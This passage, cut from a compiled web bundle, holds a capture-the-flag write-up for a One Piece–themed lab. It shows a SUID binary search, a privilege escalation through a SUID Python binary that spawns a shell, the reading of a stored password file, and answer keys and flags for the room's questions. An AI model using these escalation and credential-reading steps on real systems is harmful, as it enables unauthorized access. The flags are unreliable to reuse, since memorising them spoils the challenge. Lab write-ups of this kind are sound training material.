.profile\ndrwx------  2 M0nk3y_D_7uffy luffy 4096 Jul 29 07:21 .ssh\nM0nk3y_D_7uffy@Laugh-Tale:~$ cat laugh_tale.txt\nFinally, we reached Laugh Tale.\nAll is left to do is to find the One Piece.\nWait, there is another boat in here.\nBe careful, it is the boat of Marshall D Teach, one of the 4 Emperors. He is the one that led your brother Ace to his death.\nYou want your revenge. Let's take him down !\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"find / -type f -perm -4000 -exec ls -l {} \\; 2> /dev/null\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"-rwsr-xr-x 1 7uffy_vs_T3@ch teach 4526456 Jul 17 08:50 /usr/bin/gomugomunooo_king_kobraaa")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'M0nk3y_D_7uffy@Laugh-Tale:~$ /usr/bin/gomugomunooo_king_kobraaa -c \'import os; os.execl("/bin/sh", "sh", "-p")\'\n$ whoami\n7uffy_vs_T3@ch\n$ pwd\n/home/luffy\n$ cd ..\n$ ls -la\ntotal 16\ndrwxr-xr-x  4 root           root  4096 Jul 26 07:54 .\ndrwxr-xr-x 24 root           root  4096 Jul 29 08:04 ..\ndrwxr-xr-x  8 M0nk3y_D_7uffy luffy 4096 Jul 29 07:32 luffy\ndrwxr-xr-x  7 7uffy_vs_T3@ch teach 4096 Jul 26 08:33 teach\n$ cd teach\n$ ls -la\ntotal 56\ndrwxr-xr-x  7 7uffy_vs_T3@ch teach 4096 Jul 26 08:33 .\ndrwxr-xr-x  4 root           root  4096 Jul 26 07:54 ..\n-rw-------  1 7uffy_vs_T3@ch teach    1 Aug 14 15:24 .bash_history\n-rw-r--r--  1 7uffy_vs_T3@ch teach  220 Jul 26 07:09 .bash_logout\n-rw-r--r--  1 7uffy_vs_T3@ch teach 3771 Jul 26 07:09 .bashrc\ndrwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26 08:45 .cache\ndrwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26 08:45 .config\ndrwx------  3 7uffy_vs_T3@ch teach 4096 Jul 26 07:16 .gnupg\n-rw-------  1 7uffy_vs_T3@ch teach  334 Jul 26 07:15 .ICEauthority\ndrwx------  3 7uffy_vs_T3@ch teach 4096 Jul 26 07:15 .local\n-r--------  1 7uffy_vs_T3@ch teach  479 Jul 26 08:06 luffy_vs_teach.txt\n-r--------  1 7uffy_vs_T3@ch teach   37 Jul 26 08:02 .password.txt\n-rw-r--r--  1 7uffy_vs_T3@ch teach  807 Jul 26 07:09 .profile\ndrwx------  2 7uffy_vs_T3@ch teach 4096 Jul 26 07:16 .ssh\n-rw-r--r--  1 7uffy_vs_T3@ch teach    0 Jul 26 07:16 .sudo_as_admin_successful\n$ cat luffy_vs_teach.txt\nThis fight will determine who can take the One Piece and who will be the next Pirate King.\nThese 2 monsters have a matchless will and none of them can let the other prevail.\nEach of them have the same dream, be the Pirate King.\nFor one it means: Take over the World.\nFor the other: Be the freest man in the World.\nEach of their hit creates an earthquake felt on the entire island.\nBut in the end, Luffy thanks to his willpower won the fight.\nNow, he needs to find the One Piece.\n$ cat .password.txt\n7uffy_vs_T3@ch:Wh0_w1ll_b3_th3_k1ng?\n$\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'root@Laugh-Tale:~# ls -la\nls -la\ntotal 56\ndrwxr-xr-x  7 7uffy_vs_T3@ch teach 4096 Jul 26 08:33 .\ndrwxr-xr-x  4 root           root  4096 Jul 26 07:54 ..\n-rw-------  1 7uffy_vs_T3@ch teach    1 Aug 14 15:24 .bash_history\n-rw-r--r--  1 7uffy_vs_T3@ch teach  220 Jul 26 07:09 .bash_logout\n-rw-r--r--  1 7uffy_vs_T3@ch teach 3771 Jul 26 07:09 .bashrc\ndrwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26 08:45 .cache\ndrwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26 08:45 .config\ndrwx------  3 7uffy_vs_T3@ch teach 4096 Jul 26 07:16 .gnupg\n-rw-------  1 7uffy_vs_T3@ch teach  334 Jul 26 07:15 .ICEauthority\ndrwx------  3 7uffy_vs_T3@ch teach 4096 Jul 26 07:15 .local\n-r--------  1 7uffy_vs_T3@ch teach  479 Jul 26 08:06 luffy_vs_teach.txt\n-r--------  1 7uffy_vs_T3@ch teach   37 Jul 26 08:02 .password.txt\n-rw-r--r--  1 7uffy_vs_T3@ch teach  807 Jul 26 07:09 .profile\ndrwx------  2 7uffy_vs_T3@ch teach 4096 Jul 26 07:16 .ssh\n-rw-r--r--  1 7uffy_vs_T3@ch teach    0 Jul 26 07:16 .sudo_as_admin_successful\nroot@Laugh-Tale:~# cd ~\ncd ~\nroot@Laugh-Tale:~# pwd\npwd\n/home/teach\nroot@Laugh-Tale:~# cd /root\ncd /t\nbash: cd: /t: No such file or directory\nroot@Laugh-Tale:~# grep -iRl "One Piece" /home /usr 2> /dev/null\n/usr/share/mysterious/on3_p1ec3.txt\nroot@Laugh-Tale:~# cat /usr/share/mysterious/on3_p1ec3.txt\ncat /usr/share/mysterious/on3_p1ec3.txt\nOne Piece: S3cr3ts_0f_tH3_W0rlD_&_0f_Th3_P@st$\n')),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"What is the name of the tree that contains the 1st Road Poneglyph?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"the whale")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"What is the name of the 1st pirate you meet navigating the Apache Sea?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Donquixote Doflamingo")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"What is the name of the 2nd island you reach navigating the Apache Sea?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Whole Cake")),(0,r.kt)("ol",{start:4},(0,r.kt)("li",{parentName:"ol"},"What is the name of the friend you meet navigating the Apache Sea?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Buggy the Clown")),(0,r.kt)("ol",{start:5},(0,r.kt)("li",{parentName:"ol"},"What is the name of the 2nd Emperor you meet navigating the Apache Sea?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Kaido of the Beasts")),(0,r.kt)("ol",{start:6},(0,r.kt)("li",{parentName:"ol"},"What is the hidden message of the 4 Road Poneglyphs?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!")),(0,r.kt)("h2",{id:"task-3-laugh-tale"},"Task 3 Laugh Tale"),(0,r.kt)("p",null,"You are now able to reach Laugh Tale. Can you find the One Piece?"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Who is on Laugh Tale at the same time as Luffy?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Marshall D Teach")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"What allowed Luffy to win the fight?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"willpower")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"What is the One Piece?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"S3cr3ts_0f_tH3_W0rlD_&_0f_Th3_P@st$")))}p.isMDXComponent=!0},49441:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-10-11_13-03-0ed798a2ad8c0c7a76ef1cf72710235c.png"},39626:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-10-11_13-04-13f3f8fb193b9929a2fd3e297ffc7776.png"}}]);